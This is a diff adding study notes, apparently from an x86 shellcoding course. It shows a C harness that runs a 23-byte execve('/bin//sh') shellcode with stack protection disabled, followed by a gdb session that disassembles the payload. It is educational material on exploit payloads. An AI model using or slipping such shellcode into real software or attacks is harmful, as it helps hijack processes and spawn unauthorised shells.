@@ -4470,4 +4470,145 @@ Continuing.
 
 Shellcoding Basics:
 
+vim shellcode.c
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+./shellcode 
+Shellcode Length:  23
+$ exit
+
+gdb -q ./shellcode
+Reading symbols from /SLAE x86/Shellcode/shellcode...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) break main 
+Breakpoint 1 at 0x80483e8
+(gdb) run
+Starting program: /SLAE x86/Shellcode/shellcode 
+
+Breakpoint 1, 0x080483e8 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x080483e4 <+0>:	push   ebp
+   0x080483e5 <+1>:	mov    ebp,esp
+   0x080483e7 <+3>:	push   edi
+=> 0x080483e8 <+4>:	and    esp,0xfffffff0
+   0x080483eb <+7>:	sub    esp,0x30
+   0x080483ee <+10>:	mov    eax,0x804a014
+   0x080483f3 <+15>:	mov    DWORD PTR [esp+0x1c],0xffffffff
+   0x080483fb <+23>:	mov    edx,eax
+   0x080483fd <+25>:	mov    eax,0x0
+   0x08048402 <+30>:	mov    ecx,DWORD PTR [esp+0x1c]
+   0x08048406 <+34>:	mov    edi,edx
+   0x08048408 <+36>:	repnz scas al,BYTE PTR es:[edi]
+   0x0804840a <+38>:	mov    eax,ecx
+   0x0804840c <+40>:	not    eax
+   0x0804840e <+42>:	lea    edx,[eax-0x1]
+   0x08048411 <+45>:	mov    eax,0x8048510
+   0x08048416 <+50>:	mov    DWORD PTR [esp+0x4],edx
+   0x0804841a <+54>:	mov    DWORD PTR [esp],eax
+   0x0804841d <+57>:	call   0x8048300 <printf@plt>
+   0x08048422 <+62>:	mov    DWORD PTR [esp+0x2c],0x804a014
+   0x0804842a <+70>:	mov    eax,DWORD PTR [esp+0x2c]
+   0x0804842e <+74>:	call   eax
+   0x08048430 <+76>:	mov    edi,DWORD PTR [ebp-0x4]
+   0x08048433 <+79>:	leave  
+   0x08048434 <+80>:	ret    
+End of assembler dump.
+(gdb) print /x &code
+$1 = 0x804a014
+(gdb) x/xw 0x804a014
+0x804a014 <code>:	0x6850c031
+(gdb) x/23xb 0x804a014
+0x804a014 <code>:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
+0x804a01c <code+8>:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
+0x804a024 <code+16>:	0x53	0x89	0xe1	0xb0	0x0b	0xcd	0x80
+(gdb) break *0x0804842e
+Breakpoint 2 at 0x804842e
+(gdb) c
+Continuing.
+Shellcode Length:  23
+
+Breakpoint 2, 0x0804842e in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x080483e4 <+0>:	push   ebp
+   0x080483e5 <+1>:	mov    ebp,esp
+   0x080483e7 <+3>:	push   edi
+   0x080483e8 <+4>:	and    esp,0xfffffff0
+   0x080483eb <+7>:	sub    esp,0x30
+   0x080483ee <+10>:	mov    eax,0x804a014
+   0x080483f3 <+15>:	mov    DWORD PTR [esp+0x1c],0xffffffff
+   0x080483fb <+23>:	mov    edx,eax
+   0x080483fd <+25>:	mov    eax,0x0
+   0x08048402 <+30>:	mov    ecx,DWORD PTR [esp+0x1c]
+   0x08048406 <+34>:	mov    edi,edx
+   0x08048408 <+36>:	repnz scas al,BYTE PTR es:[edi]
+   0x0804840a <+38>:	mov    eax,ecx
+   0x0804840c <+40>:	not    eax
+   0x0804840e <+42>:	lea    edx,[eax-0x1]
+   0x08048411 <+45>:	mov    eax,0x8048510
+   0x08048416 <+50>:	mov    DWORD PTR [esp+0x4],edx
+   0x0804841a <+54>:	mov    DWORD PTR [esp],eax
+   0x0804841d <+57>:	call   0x8048300 <printf@plt>
+   0x08048422 <+62>:	mov    DWORD PTR [esp+0x2c],0x804a014
+   0x0804842a <+70>:	mov    eax,DWORD PTR [esp+0x2c]
+=> 0x0804842e <+74>:	call   eax
+   0x08048430 <+76>:	mov    edi,DWORD PTR [ebp-0x4]
+   0x08048433 <+79>:	leave  
+   0x08048434 <+80>:	ret    
+End of assembler dump.
+(gdb) print /x $eax
+$2 = 0x804a014
+(gdb) x/23xb 0x804a014
+0x804a014 <code>:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
+0x804a01c <code+8>:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
+0x804a024 <code+16>:	0x53	0x89	0xe1	0xb0	0x0b	0xcd	0x80
+(gdb) break *0x0804a014
+Breakpoint 3 at 0x804a014
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x0804a014 in code ()
+(gdb) disassemble 
+Dump of assembler code for function code:
+=> 0x0804a014 <+0>:	xor    eax,eax
+   0x0804a016 <+2>:	push   eax
+   0x0804a017 <+3>:	push   0x68732f2f
+   0x0804a01c <+8>:	push   0x6e69622f
+   0x0804a021 <+13>:	mov    ebx,esp
+   0x0804a023 <+15>:	push   eax
+   0x0804a024 <+16>:	push   ebx
+   0x0804a025 <+17>:	mov    ecx,esp
+   0x0804a027 <+19>:	mov    al,0xb
+   0x0804a029 <+21>:	int    0x80
+   0x0804a02b <+23>:	add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 22405] will be killed.
+
+Quit anyway? (y or n) y
+
+Exit Shellcode:
+
+
 
